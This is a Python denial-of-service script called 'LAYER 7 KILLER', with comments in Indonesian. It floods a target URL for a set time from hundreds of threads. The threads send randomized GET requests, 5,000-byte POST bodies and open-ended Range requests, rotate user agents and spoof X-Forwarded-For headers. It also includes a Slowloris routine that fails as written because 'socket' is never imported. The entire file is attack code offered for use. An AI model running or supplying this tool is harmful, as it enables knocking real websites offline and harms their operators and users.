#!/usr/bin/env python3
# LAYER 7 KILLER - Single Method HTTP Flood Extreme

import requests
import threading
import random
import time
import sys
import ssl
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Konfigurasi
target_url = sys.argv[1] if len(sys.argv) > 1 else input("URL Target (http://example.com): ")
threads = int(sys.argv[2]) if len(sys.argv) > 2 else 500
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60

end_time = time.time() + duration

# Payload besar untuk membebani server
large_payload = "POST / HTTP/1.1\r\n" + \
                "Host: {}\r\n".format(target_url.replace("http://","").replace("https://","").split("/")[0]) + \
                "User-Agent: {}\r\n" + \
                "Content-Type: application/x-www-form-urlencoded\r\n" + \
                "Content-Length: 10000\r\n\r\n" + \
                "x=" + "A"*9000

# Headers acak
def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    }

# Slowloris trick: keep connection open
def slowloris_attack():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        host = target_url.replace("http://","").replace("https://","").split("/")[0]
        port = 443 if "https" in target_url else 80
        sock.connect((host, port))
        if port == 443:
            sock = ssl.wrap_socket(sock)
        sock.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
        while time.time() < end_time:
            sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
            time.sleep(random.uniform(0.5, 2))
        sock.close()
    except:
        pass

# HTTP flood with large POST
def http_flood():
    session = requests.Session()
    while time.time() < end_time:
        try:
            headers = random_headers()
            # Metode 1: GET dengan random query string
            url_random = target_url + "?" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=random.randint(10,50)))
            session.get(url_random, headers=headers, timeout=3, verify=False)
            
            # Metode 2: POST dengan payload besar
            session.post(target_url, headers=headers, data={"data": "A"*5000}, timeout=3, verify=False)
            
            # Metode 3: Request dengan range header (membebani CPU)
            headers["Range"] = "bytes=0-"
            session.get(target_url, headers=headers, timeout=3, verify=False)
        except:
            pass

# Multi-thread eksekusi
print(f"[+] LAYER 7 KILLER ACTIVE")
print(f"[+] Target: {target_url}")
print(f"[+] Threads: {threads}")
print(f"[+] Duration: {duration} detik")
print("[+] Menyerang...")

# Jalankan semua thread
for _ in range(threads):
    t = threading.Thread(target=http_flood)
    t.daemon = True
    t.start()
    # Tambahkan slowloris thread juga
    if _ % 10 == 0:
        t2 = threading.Thread(target=slowloris_attack)
        t2.daemon = True
        t2.start()

# Tunggu sampai durasi habis
time.sleep(duration)
print("[+] Selesai")